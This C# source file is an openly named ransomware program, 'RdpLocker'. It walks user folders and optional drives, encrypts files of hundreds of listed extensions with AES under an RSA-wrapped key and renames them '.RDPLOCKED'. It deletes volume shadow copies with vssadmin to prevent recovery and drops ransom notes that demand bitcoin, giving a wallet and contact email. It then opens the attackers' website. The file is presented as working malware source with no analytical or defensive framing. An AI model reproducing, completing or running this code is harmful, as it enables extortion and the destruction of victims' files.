using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Services.ZagreuS
{
    public class Ransomware
    {
        // System information
        public static string username = Environment.UserName;
        public static string computerName = Environment.MachineName;
        public static string currentDirectory = Directory.GetCurrentDirectory();

        // File system paths
        public static string driveRoot = "C:\\";
        public static string usersPath = "Users\\";
        public static string desktopPath = Path.Combine(driveRoot, usersPath, username, "Desktop");
        public static string linksPath = Path.Combine(driveRoot, usersPath, username, "Links");
        public static string contactsPath = Path.Combine(driveRoot, usersPath, username, "Contacts");
        public static string documentsPath = Path.Combine(driveRoot, usersPath, username, "Documents");
        public static string downloadsPath = Path.Combine(driveRoot, usersPath, username, "Downloads");
        public static string picturesPath = Path.Combine(driveRoot, usersPath, username, "Pictures");
        public static string musicPath = Path.Combine(driveRoot, usersPath, username, "Music");
        public static string oneDrivePath = Path.Combine(driveRoot, usersPath, username, "OneDrive");
        public static string savedGamesPath = Path.Combine(driveRoot, usersPath, username, "Saved Games");
        public static string favoritesPath = Path.Combine(driveRoot, usersPath, username, "Favorites");
        public static string searchesPath = Path.Combine(driveRoot, usersPath, username, "Searches");
        public static string videosPath = Path.Combine(driveRoot, usersPath, username, "Videos");

        // Cryptographic settings
        public static byte[] passwordSalt = Encoding.ASCII.GetBytes("o6806642kbM7c5");
        public static int keyDerivationIterations = 2000;
        public static int keySize = 256;
        public static int blockSize = 128;
        public static int byteSize = 8;

        // Ransom details
        public static string bitcoinWallet = "js97xc025fwviwhdg53gla97xc025fwv";
        public static string contactEmail = "rlocked@protonmail.com";
        public static string ransomAmount = "980";
        public static string website = "http://www.RdpLocker.com/";
        public static string encryptedExtension = ".RDPLOCKED";
        public static string publicKey = "BgIAAACkAABSU0ExAAQAAAEAAQA91/HNyhqp9khGpXxsaAX0sl4HbBQEDHtxHQOmpOXunTA0ZVBx5bZTASghYUeBytuwl2A57BlMFXsUoVybHd6lNZWwdDvxJ86UmLD8mGDP4/miiqHnhYbw+CIvqHSc4t3ft/3HffBTJxhow4vMr40CqBJZKBRcXxArLnNvgb719w==";
        public static string unknownKey = "EAAAALjLXuiBxifH2aSTXCLvmUDAxFM6UUGgre9TPDi0ZfRtlYSRYyh0lEFfSWKlOlEEag==";
        public static string randomString = GenerateRandomString(30);
        public static string encryptedKey;
        public static string salt = "SALT";

        // Configuration flags (all set to "False" by default)
        public static string encryptLogicalDrives = "False";
        public static string encryptDesktop = "False";
        public static string encryptLinks = "False";
        public static string encryptContacts = "False";
        public static string encryptDocuments = "False";
        public static string encryptDownloads = "False";
        public static string encryptPictures = "False";
        public static string encryptMusic = "False";
        public static string encryptOneDrive = "False";
        public static string encryptSavedGames = "False";
        public static string encryptFavorites = "False";
        public static string encryptSearches = "False";
        public static string encryptVideos = "False";

        // File extensions to target for encryption
        public static string targetExtensions = ".txt.doc.docx.mp3.xls.xlsx.ppt.sql.wmv.mp4.mp3.dll.jar.pptx.odt.jpg.tar.gz.bmp.pbm.rtf.png.csv.sql.mdb.sln.php.avi.mov.flv.amv.mpv.mtv.asp.aspx.html.xml.psd.pdf.exe.rv.rvx.ved.wm.wmv.TXT.JPG.rar.xwmv.wma.midi.fla.pdf.wma.ico.gif.GIF.ogg.mpg.icns.RAR.png.zip.BAT.Exe.c.exe.PNG.7z.exe.EXE.sql.mp4.7z.rar.m4a.wma.avi.wmv.csv.d3dbsp.zip.sie.sum.ibank.t13.t12.qdf.gdb.tax.pkpass.bc6.bc7.bkp.qic.bkf.sidn.sidd.mddata.itl.itdb.icxs.hvpl.hplg.hkdb.mdbackup.syncdb.gho.cas.svg.map.wmo.itm.sb.fos.mov.vdf.ztmp.sis.sid.ncf.menu.layout.dmp.blob.esm.vcf.vtf.dazip.fpk.mlx.kf.iwd.vpk.tor.psk.rim.w3x.fsh.ntl.arch00.lvl.snx.cfr.ff.vpp_pc.lrf.m2.mcmeta.vfs0.mpqge.kdb.db0.dba.rofl.hkx.bar.upk.das.iwi.litemod.asset.forge.ltx.bsa.apk.re4.sav.lbf.slm.bik.epk.rgss3a.pak.bigwallet.wotreplay.xxx.desc.py.m3u.flv.js.css.rb.png.jpeg.txt.p7c.p7b.p12.pfx.pem.crt.cer.der.x3f.srw.pef.ptx.r3d.rw2.rwl.raw.raf.orf.nrw.mrw.ref.mef.erf.kdc.dcr.cr2.crw.cerber.WNCRY.dsewrbg.bay.sr2.srf.arw.3fr.dng.jpe.jpg.cdr.indd.ai.eps.pdf.pdd.psd.dbf.mdf.wb2.rtf.wpd.dxg.xf.dwg.pst.vbs.accdb.mdb.pptm.pptx.ppt.xlk.xlsb.xlsm.xlsx.xls.wps.docm.docx.doc.odb.odc.odm.odp.ods.odt";

        [STAThread]
        public static void Main()
        {
            try
            {
                // Enable UAC via registry modification
                EnableUAC();
                // Delete volume shadow copies to prevent recovery
                DeleteShadowCopies();
                // Encrypt files in specified directories
                EncryptFiles();
                // Delete shadow copies again for redundancy
                DeleteShadowCopies();
                // Notify attackers by opening website
                NotifyViaWebsite();
            }
            catch (Exception)
            {
                MessageBox.Show("ERROR");
            }
        }

        public static void EncryptFiles()
        {
            try
            {
                // Encrypt the random string with RSA and store as Base64
                encryptedKey = Convert.ToBase64String(EncryptRSA(contactEmail, randomString));

                // Encrypt all logical drives if enabled
                if (encryptLogicalDrives == "True")
                {
                    foreach (string drive in Directory.GetLogicalDrives())
                    {
                        if (drive != "C:\\")
                        {
                            EncryptDirectory(drive, randomString);
                            CreateRansomNote(drive);
                        }
                    }
                }

                // Encrypt specific directories if their flags are set to "True"
                if (encryptDesktop == "True")
                {
                    EncryptDirectory(desktopPath, randomString);
                    CreateRansomNote(desktopPath);
                }
                if (encryptLinks == "True")
                {
                    EncryptDirectory(linksPath, randomString);
                    CreateRansomNote(linksPath);
                }
                if (encryptContacts == "True")
                {
                    EncryptDirectory(contactsPath, randomString);
                    CreateRansomNote(contactsPath);
                }
                if (encryptDocuments == "True")
                {
                    EncryptDirectory(documentsPath, randomString);
                    CreateRansomNote(documentsPath);
                }
                if (encryptDownloads == "True")
                {
                    EncryptDirectory(downloadsPath, randomString);
                    CreateRansomNote(downloadsPath);
                }
                if (encryptPictures == "True")
                {
                    EncryptDirectory(picturesPath, randomString);
                    CreateRansomNote(picturesPath);
                }
                if (encryptMusic == "True")
                {
                    EncryptDirectory(musicPath, randomString);
                    CreateRansomNote(musicPath);
                }
                if (encryptOneDrive == "True")
                {
                    EncryptDirectory(oneDrivePath, randomString);
                    CreateRansomNote(oneDrivePath);
                }
                if (encryptSavedGames == "True")
                {
                    EncryptDirectory(savedGamesPath, randomString);
                    CreateRansomNote(savedGamesPath);
                }
                if (encryptFavorites == "True")
                {
                    EncryptDirectory(favoritesPath, randomString);
                    CreateRansomNote(favoritesPath);
                }
                if (encryptSearches == "True")
                {
                    EncryptDirectory(searchesPath, randomString);
                    CreateRansomNote(searchesPath);
                }
                if (encryptVideos == "True")
                {
                    EncryptDirectory(videosPath, randomString);
                    CreateRansomNote(videosPath);
                }
            }
            catch (Exception)
            {
                MessageBox.Show("ERROR");
            }
        }

        public static byte[] EncryptAES(byte[] data, byte[] key)
        {
            using (var ms = new MemoryStream())
            using (var aes = new RijndaelManaged())
            {
                aes.KeySize = keySize;
                aes.BlockSize = blockSize;
                var derive = new Rfc2898DeriveBytes(key, passwordSalt, keyDerivationIterations);
                aes.Key = derive.GetBytes(keySize / byteSize);
                aes.IV = derive.GetBytes(blockSize / byteSize);
                aes.Mode = CipherMode.CBC;

                using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.Close();
                }
                return ms.ToArray();
            }
        }

        public static void EncryptFile(string filePath, string key)
        {
            byte[] fileData = File.ReadAllBytes(filePath);
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
            keyBytes = SHA256.Create().ComputeHash(keyBytes);
            byte[] encryptedData = EncryptAES(fileData, keyBytes);
            File.WriteAllBytes(filePath, encryptedData);
            File.Move(filePath, filePath + encryptedExtension);
        }

        public static RSACryptoServiceProvider LoadPublicKey(string key)
        {
            var rsa = new RSACryptoServiceProvider();
            byte[] keyBlob = Convert.FromBase64String(key);
            rsa.ImportCspBlob(keyBlob);
            return rsa;
        }

        public static byte[] EncryptRSA(string data, string key)
        {
            using (var rsa = LoadPublicKey(publicKey))
            {
                return rsa.Encrypt(Encoding.UTF8.GetBytes(key), fOAEP: false);
            }
        }

        public static void EncryptDirectory(string path, string key)
        {
            try
            {
                string[] files = Directory.GetFiles(path);
                string[] directories = Directory.GetDirectories(path);

                foreach (string file in files)
                {
                    string extension = Path.GetExtension(file);
                    if (targetExtensions.Contains(extension))
                    {
                        EncryptFile(file, key);
                    }
                }

                foreach (string dir in directories)
                {
                    EncryptDirectory(dir, key);
                    CreateRansomNote(dir);
                }
            }
            catch (Exception)
            {
                // Swallow exceptions to continue encryption
            }
        }

        public static void EnableUAC()
        {
            try
            {
                var processInfo = new ProcessStartInfo("cmd.exe")
                {
                    Arguments = "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = false,
                    UseShellExecute = true,
                    Verb = "runas"
                };
                Process.Start(processInfo);
            }
            catch (Exception)
            {
                // Ignore errors
            }
        }

        public static void DeleteShadowCopies()
        {
            try
            {
                var processInfo = new ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(processInfo);
            }
            catch (Exception)
            {
                // Ignore errors
            }
        }

        public static void NotifyViaWebsite()
        {
            try
            {
                Process.Start(website);
            }
            catch (Exception)
            {
                // Ignore errors
            }
        }

        public static void CreateRansomNote(string path)
        {
            string[] ransomNote = {
                "Oops All Of your important files were encrypted Like document pictures videos etc..\r\n" +
                "Don't worry, you can return all your files!\r\n" +
                "All your files, documents, photos, databases and other important files are encrypted by a strong encryption.\r\n" +
                "How to recover files?\r\n" +
                "RSA is a asymmetric cryptographic algorithm, you need one key for encryption and one key for decryption so you need private key to recover your files. It’s not possible to recover your files without private key.\r\n" +
                "The only method of recovering files is to purchase an unique private key. Only we can give you this key and only we can recover your files.\r\n" +
                "What guarantees you have?\r\n" +
                "As evidence, you can send us 1 file to decrypt by email We will send you a recovery file Prove that we can decrypt your file\r\n" +
                "Please You must follow these steps carefully to decrypt your files:\r\n" +
                $"Send ${ransomAmount} worth of bitcoin to wallet: {bitcoinWallet}\r\n" +
                "after payment, we will send you Decryptor software\r\n" +
                $"contact email: {contactEmail}\r\n" +
                $"Your personal ID: {encryptedKey}"
            };
            try
            {
                File.WriteAllLines(Path.Combine(path, "HELP_DECRYPT_YOUR_FILES.txt"), ransomNote);
            }
            catch (Exception)
            {
                // Ignore errors
            }
        }

        public static string GenerateRandomString(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            byte[] randomBytes = new byte[length];
            using (var rng = new RNGCryptoServiceProvider())
            {
                rng.GetNonZeroBytes(randomBytes);
            }
            var result = new StringBuilder(length);
            foreach (byte b in randomBytes)
            {
                result.Append(chars[b % chars.Length]);
            }
            return result.ToString();
        }
    }
}
